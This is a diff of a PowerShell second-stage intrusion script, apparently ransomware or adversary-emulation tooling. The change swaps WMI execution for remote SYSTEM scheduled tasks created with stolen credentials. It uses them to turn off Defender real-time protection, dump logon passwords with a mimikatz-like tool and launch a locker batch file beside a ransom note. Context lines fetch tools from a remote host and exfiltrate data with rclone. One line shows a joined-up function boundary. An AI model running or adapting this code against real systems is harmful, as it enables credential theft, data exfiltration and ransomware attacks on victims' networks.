@@ -17,7 +17,13 @@ function W($s) { Add-Content -Path $log -Value ("{0} {1}" -f (Get-Date -Format '
 New-Item -ItemType Directory -Force -Path $work, $stage | Out-Null
 W "=== stage2 start as $(whoami) ==="
 
-function Get-Staged($name, $dest) {
+
+function Invoke-Remote($cmd, $label) {
+    & cmd.exe /c "schtasks /create /s $target /u $user /p $pw /tn C0015Task /tr `"$cmd`" /sc once /st 23:59 /ru SYSTEM /rl HIGHEST /f" 2>&1 | Out-Null
+    & cmd.exe /c "schtasks /run /s $target /u $user /p $pw /tn C0015Task" 2>&1 | Out-Null
+    Start-Sleep -Seconds 3
+    W "remote task: $label"
+}function Get-Staged($name, $dest) {
     try { Invoke-WebRequest -Uri "$base/$name" -OutFile $dest -UseBasicParsing -TimeoutSec 180; W "fetched $name"; $true }
     catch { W "fetch $name failed: $($_.Exception.Message)"; $false }
 }
@@ -75,8 +81,8 @@ if ($pw) {
     & cmd.exe /c "net use \\$target\C$ /delete /y" 2>&1 | Out-Null
 
     # ------------------------------------------------------------ credential collection on the target
-    $dumpOut = & cmd.exe /c "wmic /node:$target /user:$user /password:$pw process call create `"C:\ProgramData\mk.exe privilege::debug sekurlsa::logonpasswords exit`"" 2>&1
-    W ("dump launched: " + (($dumpOut | Select-String 'ReturnValue') -join ' '))
+    Invoke-Remote "powershell.exe -NoProfile -Command `"Set-MpPreference -DisableRealtimeMonitoring `$true`"" 'defence relaxed on target'
+    Invoke-Remote "C:\ProgramData\mk.exe privilege::debug sekurlsa::logonpasswords exit" 'credential dump on target'
 
     # ------------------------------------------------------------ exfiltration as the helpdesk account
     $rc = Join-Path $work 'rclone.exe'
@@ -89,10 +95,10 @@ if ($pw) {
     $lk = Join-Path $work 'locker.exe'
     if (Test-Path $lk) {
         Copy-Item (Join-Path $work 'readme.txt') 'C:\readme.txt' -Force
-        & cmd.exe /c "wmic /node:$target /user:$user /password:$pw process call create `"cmd.exe /c C:\locker.bat`"" 2>&1 | Out-Null
-        W 'locker requested on target'
+        Invoke-Remote "cmd.exe /c C:\locker.bat" 'locker on target'
     }
 }
 
 W "=== stage2 end ==="
+
 
